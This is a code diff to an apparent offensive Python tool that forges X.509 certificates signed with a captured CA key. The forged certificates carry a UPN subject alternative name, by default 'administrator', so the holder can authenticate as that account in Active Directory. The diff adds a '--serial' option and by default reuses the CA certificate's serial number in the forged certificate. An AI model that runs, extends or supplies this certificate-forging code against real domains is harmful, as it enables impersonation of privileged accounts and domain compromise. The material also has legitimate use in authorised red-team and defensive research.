@@ -30,7 +30,9 @@ def log():
 def print_cert_info(header, cert_decoded):
     try:
         subname = ""
+        se_nu = ""
         try:
+            se_nu = "{}".format(cert_decoded.serial_number)
             fingerprint = binascii.hexlify(cert_decoded.fingerprint(hashes.SHA256())).decode('utf-8')
             alt_name = cert_decoded.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
             san_ext_value = cast(x509.SubjectAlternativeName, alt_name.value)
@@ -42,18 +44,22 @@ def print_cert_info(header, cert_decoded):
         if subname:
             cert_data = cert_data + "\n  SubjectAltName: {}".format(subname)
         print(cert_data)
+        return se_nu
     except Exception as e:
         raise Exception(e)
 
 
-def generate_certificate(cert_decoded, subject, private_key, public_key, ldap_uri, subjectaltname):
+def generate_certificate(cert_decoded, subject, private_key, public_key, ldap_uri, subjectaltname, serialnumber):
     one_day = datetime.timedelta(1, 0, 0)
     builder = x509.CertificateBuilder()
     builder = builder.issuer_name(cert_decoded.issuer)
     builder = builder.subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, subject), ]))
     builder = builder.not_valid_before(datetime.datetime.today() - one_day)
     builder = builder.not_valid_after(datetime.datetime.today() + (one_day * 365))
-    builder = builder.serial_number(x509.random_serial_number())
+    if serialnumber:
+        builder = builder.serial_number(int(serialnumber))
+    else:
+        builder = builder.serial_number(x509.random_serial_number())
     builder = builder.public_key(public_key)
     alt_names = []
     upn_oid = x509.ObjectIdentifier('1.3.6.1.4.1.311.20.2.3')
@@ -91,6 +97,7 @@ def main():
     parser.add_argument("-s", "--subject", required=False, choices=['User', 'Computer'], default="User", help="Subject name in the certificate.")
     parser.add_argument("-a", "--altname", required=False, default="administrator", help="UPN of the user to authenticate as.")
     parser.add_argument("-o", "--output", required=True, help="Path where to save the new .pfx certificate.")
+    parser.add_argument("-se", "--serial", required=False, default=None, help="Serial number for the forged certificate.")
     parser.add_argument("-op", "--opassword", required=False, default="RAND", help="Password to the .pfx file.")
     parser.add_argument("-c", "--crl", required=False, help="Ldap path to a CRL for the forged certificate.")
     parser.add_argument('-pfx', action='store_true', help='If the input file is PFX.')
@@ -121,7 +128,11 @@ def main():
     except Exception as e:
         print("Read file error: {}".format(e))
         sys.exit(1)
-    print_cert_info("CA Certificate Information:", cert_decoded)
+    serial_number = print_cert_info("CA Certificate Information:", cert_decoded)
+    if options.serial:
+        se_nu = options.serial
+    else:
+        se_nu = serial_number
     private_key = crypto.PKey()
     private_key.generate_key(crypto.TYPE_RSA, 4096)
     crypto_pri_key = private_key.to_cryptography_key()
@@ -130,7 +141,7 @@ def main():
         ldap_uri = options.crl
     else:
         ldap_uri = ""
-    new_cert = generate_certificate(cert_decoded, options.subject, key, public_key, ldap_uri, options.altname)
+    new_cert = generate_certificate(cert_decoded, options.subject, key, public_key, ldap_uri, options.altname, se_nu)
     print_cert_info("\nForged Certificate Information:", new_cert)
     if options.opassword == "RAND":
         password = ''.join(random.choice(string.ascii_letters) for _ in range(8))
